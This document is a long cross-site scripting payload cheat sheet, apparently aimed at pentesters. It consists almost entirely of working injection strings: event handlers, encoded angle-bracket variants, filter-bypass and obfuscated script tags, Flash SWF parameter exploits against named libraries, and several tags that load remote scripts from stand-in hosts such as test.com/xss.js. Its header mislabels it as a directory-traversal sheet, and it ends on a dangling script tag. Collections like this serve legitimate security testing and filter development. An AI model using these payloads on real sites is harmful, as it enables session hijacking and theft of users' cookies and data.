ULTIMATE CROSS SITE SCRIPTING CHEAT SHEET

Note: This is a technical sheet for research about directory- and path traversal attacks.
Please continue the ultimate directory traversal cheat sheet list or contribute to update.
This cheat sheet list goes out to assist pentesters, developers, researchers & whitehats.

Tags to Trigger XSS Attacks:
onclick
ondblclick
onmousedown
onmousemove
onmouseover
onmouseout
onmouseup
onkeydown
onkeypress
onkeyup
onabort
onerror
onload
onresize
onscroll
onunload
onsubmit
onblur
onchange
onfocus
onreset
onselect
onMoveOn

Brackets for Tags
>"
">
<"
><
>"<
.\>"</.
./>%20<./
/>%20<
%20/%20>
%20">%20<
%3E%3C
Pjw=

/
%0A
%0C
%0D

&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&lt;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C

XSS Strings:
<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
<SCRIPT>document.cookie=true;</SCRIPT>
<IMG SRC="jav ascript:document.cookie=true;">
<IMG SRC="javascript:document.cookie=true;">
<IMG SRC=" &#14; javascript:document.cookie=true;">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
<SCRIPT>document.cookie=true;//<</SCRIPT>
<SCRIPT <B>document.cookie=true;</SCRIPT>
<IMG SRC="javascript:document.cookie=true;">
<iframe src="javascript:document.cookie=true;> 
<SCRIPT>a=/XSS/\ndocument.cookie=true;</SCRIPT> 
</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
<BODY BACKGROUND="javascript:document.cookie=true;">
<BODY ONLOAD=document.cookie=true;>
<IMG DYNSRC="javascript:document.cookie=true;">
<IMG LOWSRC="javascript:document.cookie=true;">
<BGSOUND SRC="javascript:document.cookie=true;">
<BR SIZE="&{document.cookie=true}">
<LAYER SRC="javascript:document.cookie=true;"></LAYER>
<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>XSS 
ºscriptædocument.cookie=true;º/scriptæ 
<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
<TABLE BACKGROUND="javascript:document.cookie=true;">
<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
<DIV STYLE="background-image: url(&#1;javascript:document.cookie=true;)">
<DIV STYLE="width: expression(document.cookie=true);">
<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(document.cookie=true)">
<XSS STYLE="xss:expression(document.cookie=true)"> 
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=true)'> 
<STYLE TYPE="text/javascript">document.cookie=true;</STYLE> 
<STYLE>.XSS{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=XSS></A> 
<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE> 
<SCRIPT>document.cookie=true;</SCRIPT>
<BASE HREF="javascript:document.cookie=true;//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
<a href="javascript#document.cookie=true;">
<div onmouseover="document.cookie=true;">
<img src="javascript:document.cookie=true;">
<img dynsrc="javascript:document.cookie=true;">
<input type="image" dynsrc="javascript:document.cookie=true;">
<bgsound src="javascript:document.cookie=true;">
&<script>document.cookie=true;</script> 
&{document.cookie=true;}; 
<img src=&{document.cookie=true;};> 
<link rel="stylesheet" href="javascript:document.cookie=true;"> 
<img src="mocha:document.cookie=true;">@mario_payload
<img src="livescript:document.cookie=true;"> 
<a href="about:<script>document.cookie=true;</script>"> 
<body onload="document.cookie=true;"> 
<div style="background-image: url(javascript:document.cookie=true;);"> 
<div style="behaviour: url([link to code]);"> 
<div style="binding: url([link to code]);"> 
<div style="width: expression(document.cookie=true;);">
<style type="text/javascript">document.cookie=true;</style>
<object classid="clsid:..." codebase="javascript:document.cookie=true;">
<style><!--</style><script>document.cookie=true;//--></script>
<<script>document.cookie=true;</script>
<script>document.cookie=true;//--></script>
<!-- -- --><script>document.cookie=true;</script><!-- -- -->
<img src="blah"onmouseover="document.cookie=true;">
<img src="blah>" onmouseover="document.cookie=true;">
<xml src="javascript:document.cookie=true;">
<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>


Restriction Bypass:
>"<iframe src=http://global-evolution.info/>@gmail.com
>"<script>alert(document.cookie)</script><div style="1@gmail.com
>"<script>alert(document.cookie)</script>@gmail.com


<html><body>
<button.onclick="alert(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,
101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1
10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));">String:fr
om.Char.Code</button></body></html>

%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%43%72%6F
%73%73%53%69%74%65%53%63%72%69%70%74%69%6E%67%32%22%29%3C%2F
%73%63%72%69%70%74%3E

Obfuscated Bypass:
>ì<ScriPt>ALeRt("xssOBFSbypass")</scriPt>



XSS with close TAG to escape:
>"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
>"<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
>"<SCRIPT>document.cookie=true;</SCRIPT>
>"<IMG SRC="jav ascript:document.cookie=true;">
>"<IMG SRC="javascript:document.cookie=true;">
>"<IMG SRC=" &#14; javascript:document.cookie=true;">
>"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
>"<SCRIPT>document.cookie=true;//<</SCRIPT>
>"<SCRIPT <B>document.cookie=true;</SCRIPT>
>"<IMG SRC="javascript:document.cookie=true;">
>"<iframe src="javascript:document.cookie=true;> 
>"<SCRIPT>a=/XSS/\ndocument.cookie=true;</SCRIPT> 
>"</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
>"<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
>"<BODY BACKGROUND="javascript:document.cookie=true;">
>"<BODY ONLOAD=document.cookie=true;>
>"<IMG DYNSRC="javascript:document.cookie=true;">
>"<IMG LOWSRC="javascript:document.cookie=true;">
>"<BGSOUND SRC="javascript:document.cookie=true;">
>"<BR SIZE="&{document.cookie=true}">
>"<LAYER SRC="javascript:document.cookie=true;"></LAYER>
>"<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
>"<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>XSS 
>"ºscriptædocument.cookie=true;º/scriptæ 
>"<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
>"<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
>"<TABLE BACKGROUND="javascript:document.cookie=true;">
>"<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
>"<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
>"<DIV STYLE="background-image: url(&#1;javascript:document.cookie=true;)">
>"<DIV STYLE="width: expression(document.cookie=true);">
>"<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
>"<IMG STYLE="xss:expr/*XSS*/ession(document.cookie=true)">
>"<XSS STYLE="xss:expression(document.cookie=true)"> 
>"exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=true)'> 
>"<STYLE TYPE="text/javascript">document.cookie=true;</STYLE> 
>"<STYLE>.XSS{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=XSS></A> 
>"<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE> 
>"<SCRIPT>document.cookie=true;</SCRIPT>
>"<BASE HREF="javascript:document.cookie=true;//">
>"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
>"<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
>"<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
>"<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
>"<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
>"<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
>"<a href="javascript#document.cookie=true;">
>"<div onmouseover="document.cookie=true;">
>"<img src="javascript:document.cookie=true;">
>"<img dynsrc="javascript:document.cookie=true;">
>"<input type="image" dynsrc="javascript:document.cookie=true;">
>"<bgsound src="javascript:document.cookie=true;">
>"&<script>document.cookie=true;</script> 
>"&{document.cookie=true;}; 
>"<img src=&{document.cookie=true;};> 
>"<link rel="stylesheet" href="javascript:document.cookie=true;"> 
>"<img src="mocha:document.cookie=true;"> 
>"<img src="livescript:document.cookie=true;"> 
>"<a href="about:<script>document.cookie=true;</script>"> 
>"<body onload="document.cookie=true;"> 
>"<div style="background-image: url(javascript:document.cookie=true;);"> 
>"<div style="behaviour: url([link to code]);"> 
>"<div style="binding: url([link to code]);"> 
>"<div style="width: expression(document.cookie=true;);">
>"<style type="text/javascript">document.cookie=true;</style>
>"<object classid="clsid:..." codebase="javascript:document.cookie=true;">
>"<style><!--</style><script>document.cookie=true;//--></script>
>"<<script>document.cookie=true;</script>
>"<script>document.cookie=true;//--></script>
>"<!-- -- --><script>document.cookie=true;</script><!-- -- -->
>"<img src="blah"onmouseover="document.cookie=true;">
>"<img src="blah>" onmouseover="document.cookie=true;">
>"<xml src="javascript:document.cookie=true;">
>"<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
>"<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>


"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)


Others: Random
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://test.com/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RM'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

<IMG
SRC
=
"
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
"
>


perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out


<IMG SRC=" &#14;  javascript:alert('XSS');">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://test.com/xss.js?<B>
<SCRIPT SRC=//test.com/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://test.com/index.html <
<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://test/script.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://test.com/xss.css">
<STYLE>@import'http://test.com/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://test.com/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://test.com/xssmoz.xml#xss")}</STYLE>
<XSS STYLE="behavior: url(xss.htc);">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="mocha:[code]">
<IMG SRC="livescript:[code]">
ºscriptæalert(¢XSS¢)º/scriptæ
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">  exp/*<A STYLE='no\xss:noxss("*//*");  xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<!--[if gte IE 4]>   <SCRIPT>alert('XSS');</SCRIPT>   <![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://test.com/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
<EMBED SRC="http://test.com/xss.swf" AllowScriptAccess="always"></EMBED>

<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>

<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>


<EMBED SRC="data:image/svg+xml;base64,JTIwPiI8PGlmcmFtZSBzcmM9aHR0cDovL3Z1bG4tbGFiLmNvbSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSA8" type="image/svg+xml" AllowScriptAccess="always"></EMBED>


Flash SWF XSS

    ZeroClipboard: ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf

    plUpload Player: plupload.flash.swf?%#target%g=alert&uid%g=XSS&

    plUpload MoxiePlayer: Moxie.swf?target%g=confirm&uid%g=XSS (also works with Moxie.cdn.swf and other variants)

    FlashMediaElement: flashmediaelement.swf?jsinitfunctio%gn=alert1

    videoJS: video-js.swf?readyFunction=confirm and video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29

    YUI "io.swf": io.swf?yid=\"));}catch(e){alert(document.domain);}//

    YUI "uploader.swf": uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<

    Open Flash Chart: open-flash-chart.swf?get-data=(function(){alert(1)})()

    AutoDemo: control.swf?onend=javascript:alert(1)//

    Adobe FLV Progressive: /main.swf?baseurl=asfunction:getURL,javascript:alert(1)// and /FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//

    Banner.swf (generic): banner.swf?clickTAG=javascript:alert(document.domain);//

    JWPlayer (legacy): player.swf?playerready=alert(document.domain) and /player.swf?tracecall=alert(document.domain)

    SWFUpload 2.2.0.1: swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//

    Uploadify (legacy): uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf

    FlowPlayer 3.2.7: flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf



a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);


XML Schema
<HTML xmlns:xss>
  <?import namespace="xss" implementation="http://vuln-lab.com/xss.htc">
  <xss:xss>XSS</xss:xss>

<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>


<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>


<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>


<?xml version="1.0" ?>
<someElement>
<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>


XSS'\x22"%22>4<%\u0022/*


<SCRIPT SRC="http://test.com/xss.jpg"></SCRIPT>


<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://test.com/xss.js></SCRIPT>'"-->

<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>

<IMG SRC="http://www.test.com/file.php?variables=malicious">

Redirect 302 /test.jpg http://test.com/admin.asp&deleteuser

<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://test.com/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://test.com/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://test.com/xss.js"></SCRIPT>
<A HREF="http://server.com/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="javascript:document.location='http://www.test.com/'">XSS</A>

%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%74%65%73%74%2E%64%65%3E

&#x3C;&#x69;&#x66;&#x72;&#x61;&#x6D;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x74;&#x65;&#x73;&#x74;&#x2E;&#x64;&#x65;&#x3E;

&#60&#105&#102&#114&#97&#109&#101&#32&#115&#114&#99&#61&#104&#116&#116&#112&#58&#47&#47&#116&#101&#115&#116&#46&#100&#101&#62

PGlmcmFtZSBzcmM9aHR0cDovL3Rlc3QuZGU+


<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

<sVg><scRipt >alert&lpar;1&rpar; {Opera}

<img/src=`` onerror=this.onerror=confirm(1) 

<form><isindex formaction="javascript&colon;confirm(1)"

<img src=``&NewLine; onerror=alert(1)&NewLine;


<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>


<img src='1' onerror\x00=alert(0) />

<img src='1' onerror/=alert(0) />

<img src='1' onerror\x0b=alert(0) />

<img src='1' onerror=\x00alert(0) />

<img src='1' o\x00nerr\x00or=alert(0) />

<\x00img src='1' onerror=alert(0) />

<script\x00>alert(1)</script>

<i\x00mg src='1' onerror=alert(0) />

<img/src='1'/onerror=alert(0)>

<img\x0bsrc='1'\x0bonerror=alert(0)>

<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">

<img src='1'\x00onerror=alert(0)>

<img src='1'onerror=alert(0)>

ì><img title="test-xss" onmouseup="confirm(document.domain)">


Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->


<img src='1' onerror='alert(0)' <

Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>

<style>body{background-color:expression\(alert(1))}</style>


<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>


<img src="1" onerror="alert(1)" />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>


<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>


<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>


<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>

<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>


<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>


< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE


<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-


<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e


<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A


<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />


<blah style="blah:expression(alert(1))" />


<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />


<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>


<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>


<script>
var junk = '</script><script>alert(1)</script>';
</script>


<style>
body { background-image:url('http://www.test.com/</style><script>alert(1)</script>'); }
</style>


<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)


http://test.com/something.xxx?a=val1&a=val2
ASP.NET a = val1,val2
ASP a = val1,val2
JSP a = val1
PHP a = val2


<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)

http://test.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)


<iframe src="http://test.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>


<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>


<script>
